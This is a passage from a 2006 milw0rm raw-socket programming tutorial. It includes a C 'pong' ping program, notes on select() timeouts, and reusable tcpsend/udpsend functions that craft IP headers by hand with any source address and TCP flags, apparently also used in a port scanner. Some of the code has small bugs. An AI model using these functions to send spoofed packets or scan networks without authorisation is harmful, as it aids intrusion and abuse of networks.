+if(sendto(rawsock, puffer, sizeof(puffer), 0, (struct sockaddr *)&amp;servaddr, sizeof(servaddr))
+!= sizeof(puffer))
+
+fprintf(stderr, .cannot send to whole paket\n.);
+
+As the first argument we take a raw-socket with the &quot;puffer&quot; with the size &quot;sizeof(puffer)&quot;
+is to be send. The destinationinformation is in &quot;servaddr&quot;. When &quot;sendto&quot; did not send all
+bytes in &quot;puffer&quot; we get a failure messages.
+
+7.4 Exampleprogramm
+
+Now after we know how we send datapacket, we will write a cheap version of the &quot;ping&quot;
+programm. This programm will send a ICMP echo packet (code=0&amp;&amp;type=8) and wait on an ICMP
+echo-reply(code=0&amp;&amp;type0=). We will explain a new function in a fast turn: .setsockopt..
+
+/*pong v 0.5    -    l0om*/
+
+#include &lt;stdio.h&gt;
+
+#include &lt;netinet/in.h&gt;
+
+#include &lt;netinet/ip.h&gt;
+
+#include &lt;netinet/ip_icmp.h&gt;
+
+unsigned short in_cksum(unsigned short *ptr, int nbytes);
+
+int read_answer(int *sock);
+
+Two functionprotyps are needed. With &quot;in_cksum&quot; we calculate the checksum of the ICMP packet
+(what a checksum is should be clear...) and with &quot;read_answer&quot; we wait for the echo-reply.
+
+unsigned short in_cksum(unsigned short *ptr, int nbytes)
+
+{
+
+            register long                  sum;                /* assumes long == 32 bits */
+
+            u_short                         oddbyte;
+
+            register u_short answer;            /* assumes u_short == 16 bits */
+
+            /*
+
+             * Our algorithm is simple, using a 32-bit accumulator (sum),
+
+             * we add sequential 16-bit words to it, and at the end, fold back
+
+             * all the carry bits from the top 16 bits into the lower 16 bits.
+
+             */
+
+            sum = 0;
+
+            while (nbytes &gt; 1)  {
+
+                        sum += *ptr++;
+
+                        nbytes -= 2;
+
+            }
+
+                                               /* mop up an odd byte, if necessary */
+
+            if (nbytes == 1) {
+
+                        oddbyte = 0;                 /* make sure top half is zero */
+
+                        *((u_char *) &amp;oddbyte) = *(u_char *)ptr;   /* one byte only */
+
+                        sum += oddbyte;
+
+     }
+
+            /*
+
+             * Add back carry outs from top 16 bits to low 16 bits.
+
+             */
+
+            sum  = (sum &gt;&gt; 16) + (sum &amp; 0xffff);      /* add high-16 to low-16 */
+
+            sum += (sum &gt;&gt; 16);                            /* add carry */
+
+            answer = ~sum;                        /* ones-complement, then truncate to 16
+	    bits */
+
+            return(answer);
+
+}
+
+When the checksum are calculated, often the above outlined fucntion is used. This is not from
+the author, but is always used by him with great pleasure   ;).
+
+int read_answer(int *sock)
+
+{
+
+  char buff[1024];
+
+  struct iphdr *ip;
+
+  struct icmphdr *icmp;
+
+  ip = (struct iphdr *)buff;
+
+  icmp = (struct icmphdr *) (buff + sizeof(struct iphdr));
+
+  if(read(*sock, buff, sizeof(buff)) &gt; 0) {
+
+    if(icmp-&gt;type == 0 &amp;&amp; icmp-&gt;code == 0) return 1;
+
+    else return -1;
+
+  }
+
+  return 0;
+
+}
+
+To this function we pass our raw-ICMP-socket, on which we later listen for an answer. First
+we declare a datapuffer of 1024 bytes and set the ip and afterwards the ICMP structur into
+it. Now we call &quot;read&quot; and listen for an answer. When we read an ICMP message, we first look
+at the type and code. If we are working wiht an echo-reply, the function gives a returnvalue
+of 1. Else -1 is put out.
+
+int main(int argc, char **argv)
+
+{
+
+  int sockfd, test = 1;
+
+  char *packet;
+
+  struct iphdr *ip;
+
+  struct icmphdr *icmp;
+
+  struct sockaddr_in server;
+
+  char *tests = &quot;hallo&quot;;
+
+  if(argc != 3) {
+
+    printf(&quot;usage: pong [sourceip] [destip]\n&quot;);
+
+    return -1;
+
+  }
+
+  ip = (struct iphdr *) malloc(sizeof(struct iphdr));
+
+  icmp = (struct icmphdr *) malloc(sizeof(struct icmphdr));
+
+  packet = (char *) malloc(sizeof(struct iphdr) + sizeof(struct icmphdr)+sizeof(tests)+1);
+
+  memset(packet, '\0',sizeof(packet));
+
+  ip = (struct iphdr *)packet;
+
+  icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
+
+  strcpy(packet+sizeof(struct iphdr)+sizeof(struct icmphdr),tests);
+
+  ip-&gt;ihl = 5;
+
+  ip-&gt;version = 4;
+
+  ip-&gt;tos = 0;
+
+  ip-&gt;tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr)+sizeof(tests)+1;
+
+  ip-&gt;id = htons(getuid());
+
+  ip-&gt;ttl = 255;
+
+  ip-&gt;protocol = IPPROTO_ICMP;
+
+  ip-&gt;saddr = inet_addr(argv[1]);
+
+  ip-&gt;daddr = inet_addr(argv[2]);
+
+  sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+
+  if(sockfd &lt; 0) {
+
+    printf(&quot;error cannto creat socket\n&quot;);
+
+    return -1;
+
+  }
+
+  if( (setsockopt(sockfd, IPPROTO_IP,IP_HDRINCL,&amp;test,sizeof(test))) &lt; 0) {
+
+    printf(&quot;couldnt set IP_HDRINCL\n&quot;);
+
+    return -1;
+
+  }
+
+  icmp-&gt;type = 8;
+
+  icmp-&gt;code = 0;
+
+  icmp-&gt;un.echo.id = 0;
+
+  icmp-&gt;un.echo.sequence = 0;
+
+  icmp-&gt;checksum = 0;
+
+  icmp-&gt;checksum = in_cksum((unsigned short *)icmp,sizeof(struct icmphdr)+sizeof(tests)+1);
+
+  ip-&gt;check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
+
+  server.sin_family = AF_INET;
+
+  server.sin_port = htons(80);  /* doesnt matter */
+
+  server.sin_addr.s_addr = inet_addr(argv[2]);
+
+  if( (sendto(sockfd,packet,ip-&gt;tot_len,0,(struct sockaddr *)&amp;server,
+
+                  sizeof(struct sockaddr))) &lt; ip-&gt;tot_len) {
+
+    printf(&quot;cannot send the packet\n&quot;);
+
+    return -1;
+
+  }
+
+  printf(&quot;done!\n&quot;);
+
+  if(read_answer(&amp;sockfd) == 1) printf(&quot;received answer- host is up\n&quot;);
+
+  else printf(&quot;didnt receive answer\n&quot;);
+
+  return 0;
+
+}
+
+We declare like before first our datapacket and the needed header. More we put the
+dataconent. We will send the string that &quot;test&quot; contains as datacontent. That dos not have a
+deeper meaning, but bring the usage of the dataarea nearer to the user. Now we check if the
+programm is called corectly. The first argument has to be the source IP-adress and the second
+argument has to be the dest IP-adress. Then it is time to fill the ip-header. Then we create
+us our ICMP-raw-socket and realise now a new function.
+
+Throughthis form of call of the function, we have the kernel to keep his hands off of our
+selfcreated datapacket. If we would not use this function, the kernel would more bad than
+good define the fields like ip-source. The konstant &quot;IP_HDRINCL&quot; tells the kenel, that the
+ip-header should be untouched. We don´t go deeper into this function, cause we only need this
+function in this form. For more Information.:
+
+l0om@home:~&gt; man setsockopt
+
+Now it is time to fill in the ICMP data and to turn to the wellknown &quot;sockaddr&quot; structur. Now
+we call &quot;sendto&quot; in an &quot;if&quot; structur and check at the same time if the packet is send
+completly. If yes we get a &quot;done!&quot; and the &quot;read_answer&quot; function is called. As argument to
+this function we pass the reference of our raw-socket. On a returnvalue of 1 we should get a
+message about. Otherwise a &quot;didnt receive answer&quot; over stdout.
+
+A Test with a remotehost in the local network:
+
+root:~ # gcc -o pong pong.c
+
+root:~ # ./pong 192.168.1.102 192.168.1.1
+
+done!
+
+received answer- host is up
+
+root:~ # ./pong 192.168.1.102 1.1.1.1  # Now a ping to a not existend host...
+
+done!
+
+^C # after long waitin time termination with Ctrl+C - interrupt send!
+
+On a ping to a active host in the local network we get a message about, that we received an
+echo-reply. So &quot;read&quot; received data. On a ping to a not exitend host, the program hangs in
+the middle. How that?
+
+The &quot;read&quot; fucntion which we call in the &quot;read_answer&quot; fucntion is layed out that way that it
+blocks till it gets data to read. Otherwise &quot;read&quot; dosn´t give a returnvalue. That means at
+the same time that we dont advance in the &quot;if&quot; loop if no answer comes in. We so need for a
+correct run of the progamm a nonblocking alternative, that after some time tells us, that
+nothing is received. For that we take a look at a very handy function.
+
+7.5 select
+
+With this function we will be able to wait for a certain event and either on success or on
+time elaps get active again.
+
+Functionsdefinition
+
+#include &lt;sys/select.h&gt;
+
+#include &lt;sys/time.h&gt;    /* optimal */
+
+int select(int maxfd, fd_set *readset, fd_set *writeset, fd_set *exceptset, const struct
+timeval *timeout);
+
+Returnvalue
+
+A positive number, which stands for the ready destcribtors.
+
+On Timeout 0 is return and on failue -1.
+
+Arguments
+
+First we will take on the last four arguments. We take a look on the &quot;timeval&quot; structur. This
+contains two structruelements:
+
+long tv_sec; /*seconds to wait */
+
+long tv_usec; /* u-seconds to wait */
+
+There are three posibilitys:
+
+The function can wait forever till one of the three possible desctribtors are ready. For this
+we give the NULL constant.
+
+The waiting for a certain timespan. The function returns only when one possible describtor is
+ready, or when the time is elapsed. We initialise the time with help of the structurelements.
+
+WE can also totaly avoid this. That means clearly the function checks the desctribtors only
+once and returns. For this we give both the variable of the &quot;timeval&quot; structur a value of 0.
+
+The three middle arguments readset, writeset and exeptset state the describtors, which should
+be tested by the kernel for read, write and execption statments
+
+When is a expection condition met?
+
+If:
+
+-The arraviale of Out-of-band data on a socket is met.
+
+-The presence of a controlstatusinformation, which is to be read from the master side of a
+termial comes in.
+
+When is a read condition met?
+
+If:
+
+-data come in on a socket.
+
+-A FIN is received. That causes that the readoperation dos not longer block and so return.
+
+-The socket is a listening socket (listen)) and a complet connection via &quot;accept&quot; is gotten.
+
+-A socket error occurs. When for example a readoperation dos not block and an error is
+returned.
+
+When is a read condition met?
+
+If:
+
+-The socket has data reveived data for sending and is connected. That is only important when
+its is a TCP connection. A UDP or raw-socket dos not need a connection.
+
+-The writing half of the connection is closed.
+
+-A writing operation failed and gives back a negative returnvalue.
+
+To have certain socket (or other thinkable imaginable desctribtors) checked for certain
+conditions by select, we use four makros. In short the variabletyp &quot;fd_set&quot; gets atleast one
+desctribtor assigned.
+
+void FD_ZERO(fd_set *fdset);  /* delets all Bits in fdset*/
+
+void FD_SET(int fd, fd_set **fdset); /* truns bit for &quot;fd&quot;
+
+                                        in &quot;fdset&quot; on. /*
+
+void FD_CLR(int fd, fd_set **fdset); /* delets Bit for &quot;fd&quot; in
+
+                                        &quot;fdset&quot; */
+
+int FD_ISSET(int fd, fd_set **fdset); /* is the bit Bit &quot;fd&quot; in
+
+                                        &quot;fdset&quot; on/ready? */
+
+&quot;maxfd&quot; tells the function &quot;select&quot; howmany destricbtors it has to surveil. Best in my
+opinion is when one adds desctribor for dectribtos. Never (!) forget the one extra
+desctribtor. We add always one more to our sum. Why does not matter in this case (it comes
+from the index of array which known start by 0...).
+
+Example:
+
+We want to socket to be check for read readiness.
+
+/* start */ fd_set rset;
+
+...
+
+FD_ZERO(&amp;rset);
+
+FD_SET(socket_one, &amp;rset);
+
+FD_SET(socket_two, &amp;rset);
+
+/* Now both sockets are check via rset - for what, we put donw now.*/
+
+select(socket_one+socket_two+1, &amp;rset, NULL, NULL, NULL) /*sleep
+
+                                                      forever */
+
+...
+
+if(FD_ISSET(socket_one, &amp;rset))) /*socket_one ready for reading?*/
+
+do_something_with_sock(socket_one);
+
+...
+
+if(FD_ISSET(socket_two, &amp;rset))) /*socket_two ready for reading?*/
+
+do_something_with_sock(socket_two);
+
+...
+
+/* end */
+
+We declare us one varibale of typ &quot;fd_set&quot; named &quot;rset&quot;. This varibale is set completty to 0.
+That happens wiht the &quot;FD_ZERO&quot; Makro. Now we set certain Bits to TRUE to tell the variable
+&quot;rset&quot;, which desctribtrors we want to be cheked. This is reached witht the help of The
+&quot;FD_SET&quot; makro. Now we call &quot;select&quot;. On &quot;maxfd&quot; we add all nedded desctribtors an dont
+forget the &quot;+1&quot; at the end. On the &quot;readfd&quot; argument we put in our variable &quot;rset&quot; and check
+within, if one of the socket is ready for reading.
+
+On the &quot;timeval&quot; we put in NULL - we wait for ever till one of the sockets is redy for
+reding. We assume that someday it goes on and we only have to mark, whcih one of the two
+desctribtors is ready for reading. That we doe with the &quot;FD_ISSET&quot; makro.
+
+7.6 Improvments for .pong.
+
+Now we know hoe to solve our previous problem of the blocking reading operation. How does it
+look in the field?
+
+We need only include two further header. Namely &quot;sys/time.h&quot; and &quot;sys/select.h&quot; and cann
+beginn then to improve the function &quot;read_answer&quot;. Here the best solution:
+
+int read_answer(int *sock)
+
+{
+
+  char buff[1024];
+
+  struct iphdr *ip;
+
+  struct icmphdr *icmp;
+
+  fd_set rset;
+
+  struct timeval tv;
+
+  FD_ZERO(&amp;rset);
+
+  FD_SET(*sock, &amp;rset);
+
+  tv.tv_sec = 3; /* we wait 3 seconds for an answer */
+
+  tv.tv_usec = 0;
+
+  ip = (struct iphdr *)buff;
+
+  icmp = (struct icmphdr *) (buff + sizeof(struct iphdr));
+
+  select(*sock+1, &amp;rset, NULL, NULL, &amp;tv);
+
+  if(FD_ISSET(*sock, &amp;rset)) {
+
+  if(read(*sock, buff, sizeof(buff)) &gt; 0) {
+
+    if(icmp-&gt;type == 0 &amp;&amp; icmp-&gt;code == 0) return 1;
+
+    else return -1;
+
+    }
+
+  }
+
+  return 0;
+
+}
+
+With this improved version of the programm, we have solved our problem. The readin operaton
+blocks only for three seconds (tv_sec) or receives ICMP-data.
+
+#########NOTE#########
+
+The function still contains one error, which you can solve to your liking. ping your self and
+see what happens...
+
+######################
+
+The &quot;select&quot; function also is used in many server-applications to avoid the blocking of
+functions.
+
+7.7 Functions for easy/fast Raw-Socket programming
+
+Here i will now put in selfwritten ( and working) raw-ip function. With the help of these
+function you can - if you want - tcp or udp raw packete versenden. Each sucker is happily
+invited to use this functins. An example for ICMP already is layed out above...
+
+The functions return 0 on failure or the number of send bytes when everything worked fine.
+
+----start here----
+
+/* prototyp tcp send */
+
+ ssize_t tcpsend(u_int saddr, u_int daddr, unsigned short sport, unsigned short dport,
+ unsigned char flags, char *data, unsigned short datalen);
+
+/* prototyp udp send */
+
+ssize_t udpsend(u_int saddr, u_int daddr, unsigned short sport, unsigned short dport, char
+*data, unsigned short datalen);
+
+/* prototyp checksum */
+
+unsigned short in_cksum(unsigned short *ptr, int nbytes);
+
+/* define the pseudohdr */
+
+struct pseudohdr {              /* for creating the checksums */
+
+  unsigned long saddr;
+
+  unsigned long daddr;
+
+  char useless;
+
+  unsigned char protocol;
+
+  unsigned short length;
+
+};
+
+ssize_t tcpsend(unsigned int saddr, unsigned int daddr, unsigned short sport,
+
+                        unsigned short dport, unsigned char flags, char *data,
+
+                        unsigned short datalen)
+
+{
+
+  char *packet;
+
+  struct iphdr *ip;
+
+  struct tcphdr *tcp;
+
+  struct pseudohdr *pseudo;
+
+  struct sockaddr_in servaddr;
+
+  int retval, sockfd, on = 1;
+
+  packet = (char *)malloc((sizeof(struct iphdr)+
+
+                                      sizeof(struct tcphdr)+datalen)*sizeof(char));
+
+  servaddr.sin_family = AF_INET;
+
+  servaddr.sin_port = htons(dport);
+
+  servaddr.sin_addr.s_addr = daddr;
+
+  sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+
+  if(sockfd &lt; 0) {
+
+   fprintf(stderr,&quot;cannot creat socket\n&quot;);
+
+   return(0);
+
+ }
+
+ if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &amp;on, sizeof(on)) == -1) {
+
+   fprintf(stderr, &quot;cannot setservaddr\n&quot;);
+
+   return(0);
+
+ }
+
+ ip = (struct iphdr *)packet;
+
+ tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
+
+ pseudo = (struct pseudohdr *)(packet + sizeof(struct iphdr) - sizeof(struct
+
+pseudohdr));
+
+ memset(packet, 0x00, sizeof(packet));
+
+ memcpy(packet+sizeof(struct iphdr)+sizeof(struct tcphdr), data, datalen);
+
+ pseudo-&gt;saddr = saddr;
+
+ pseudo-&gt;daddr = daddr;
+
+ pseudo-&gt;protocol = IPPROTO_TCP;
+
+ pseudo-&gt;length = htons(sizeof(struct tcphdr) + datalen);
+
+ tcp-&gt;th_sport = htons(sport);
+
+ tcp-&gt;th_dport = htons(dport);
+
+ tcp-&gt;th_seq = rand() + rand();
+
+ tcp-&gt;th_ack = rand() + rand();
+
+ tcp-&gt;th_off = 5;
+
+ tcp-&gt;th_flags = flags;
+
+ tcp-&gt;th_win = htons(2048);
+
+ tcp-&gt;th_sum = in_cksum((unsigned short *)pseudo, sizeof(struct tcphdr) +
+
+                               sizeof(struct pseudohdr) + datalen);
+
+ memset(ip, 0x00, sizeof(struct iphdr));
+
+ ip-&gt;version = 4;
+
+ ip-&gt;ihl = 5;
+
+ ip-&gt;tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + datalen);
+
+ ip-&gt;id = rand();
+
+ ip-&gt;ttl = 255;
+
+ ip-&gt;protocol = IPPROTO_TCP;
+
+ ip-&gt;saddr = saddr;
+
+ ip-&gt;daddr = daddr;
+
+ ip-&gt;check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
+
+ if((retval = sendto(sockfd, packet, ntohs(ip-&gt;tot_len), 0,
+
+                          &amp;servaddr, sizeof(servaddr))) == -1)
+
+  return(0);
+
+   close(sockfd); return(retval);
+
+}
+
+ssize_t udpsend(u_int saddr, u_int daddr, unsigned short sport, unsigned short dport, char
+*data, unsigned short datalen)
+
+{
+
+             struct  sockaddr_in servaddr;
+
+            struct    iphdr *ip;
+
+            struct    udphdr *udp;
+
+            struct pseudohdr *pseudo;
+
+             char packet[sizeof(struct iphdr)+sizeof(struct udphdr)+datalen];
+
+            int nbytes, sockfd, on = 1;
+
+            sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+            if(sockfd &lt; 0) {
+
+              fprintf(stderr,&quot;cannt creat socket\n&quot;);
+
+              return(0);
+
+            }
+
+            if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &amp;on, sizeof(on)) == -1) {
+
+              fprintf(stderr, &quot;cannot setsockopt\n&quot;);
+
+              return(0);
+
+            }
+
+             memset(packet, 0x00, sizeof(packet));
+
+            memcpy(packet+sizeof(struct iphdr)+sizeof(struct udphdr), data, datalen);
+
+            servaddr.sin_addr.s_addr = daddr;
+
+            servaddr.sin_port = htons(dport);
+
+            servaddr.sin_family = AF_INET;
+
+            ip     = (struct iphdr *)packet;
+
+            udp    = (struct udphdr *)(packet + sizeof(struct iphdr));
+
+             pseudo = (struct pseudohdr *)(packet + sizeof(struct iphdr)
+
+                                                            - sizeof(struct pseudohdr));
+
+             udp-&gt;uh_sport = htons(sport);
+
+            udp-&gt;uh_dport = htons(dport);
+
+            udp-&gt;uh_sum = 0;
+
+            udp-&gt;uh_ulen = htons(sizeof(struct udphdr)+datalen);
+
+              pseudo-&gt;saddr    = saddr;
+
+            pseudo-&gt;daddr    = daddr;
+
+            pseudo-&gt;useless     = 0;
+
+            pseudo-&gt;protocol = IPPROTO_UDP;
+
+            pseudo-&gt;length   = udp-&gt;uh_ulen;
+
+            udp-&gt;uh_sum = in_cksum((u_short *)pseudo,sizeof(struct udphdr)+sizeof(struct
+
+pseudohdr)+datalen);
+
+            ip-&gt;ihl      = 5;
+
+            ip-&gt;version  = 4;
+
+            ip-&gt;tos      = 0x10;
+
+            ip-&gt;tot_len  = sizeof(packet);
+
+            ip-&gt;frag_off = 0;
+
+            ip-&gt;ttl      = 69;
+
+            ip-&gt;protocol = IPPROTO_UDP;
+
+            ip-&gt;check    = 0;
+
+            ip-&gt;saddr    = saddr;
+
+            ip-&gt;daddr    = daddr;
+
+            nbytes = sendto(sockfd, packet, ip-&gt;tot_len, 0, (struct sockaddr *)&amp;servaddr,
+
+sizeof(servaddr));
+
+            close(sockfd);
+
+            return(nbytes);
+
+}
+
+unsigned short in_cksum(unsigned short *ptr, int nbytes)
+
+{
+
+  register long    sum;
+
+  u_short oddbyte;
+
+  register u_short answer;
+
+  sum = 0;
+
+  while(nbytes &gt; 1)
+
+  {
+
+    sum += *ptr++;
+
+    nbytes -= 2;
+
+  }
+
+  if(nbytes == 1)
+
+  {
+
+    oddbyte = 0;
+
+    *((u_char *) &amp;oddbyte) = *(u_char *)ptr;
+
+    sum += oddbyte;
+
+  }
+
+  sum  = (sum &gt;&gt; 16) + (sum &amp; 0xffff);
+
+  sum += (sum &gt;&gt; 16);
+
+  answer = ~sum;
+
+  return(answer);
+
+}
+
+----end here----
+
+These functions i also use in the tcp/udp scanner &quot;gull&quot;. If there still are
+misunderstandings of the usage of the function, see gull.c for wisdom.
+
+8.0 Summary
+
+Thos this was the introduction into networkprogramming. Only the main important things were
+covered and we had a short look on UDP applications. I hope you learned something and found
+the programming examples intresting and suiting.
+
+Me for my part has writen enough and thinks, that this should be enough for an introdutcion.
+For that i remain with a wise word.:
+
+&quot;Stone for Stone, with premeditation,
+
+                    at last gives a building&quot;
+
+    -Goethe
+
+9.0 Greets
+
+Greets fly out to the whole Toxic Source Developers: blowfish and lexdiamond.
+
+Greets to all Members of European Security Crew like:
+
+Xnet, ProXy, Takt, nixon, Havoc][, Synopsis, Cyniker ...
+
+All coders and security fans.
+
+All Human who are on a Quest for the light.
+
+&quot;i met you in the circle of light.
+
+ your gifts had been believe, hope and love.
+
+ Today i know, there had been no begin, but also no end.&quot;
+
+     -l0om
+
+Translated by TT´s[EnGer]
+
+# milw0rm.com [2006-04-13]</pre>
+</html>
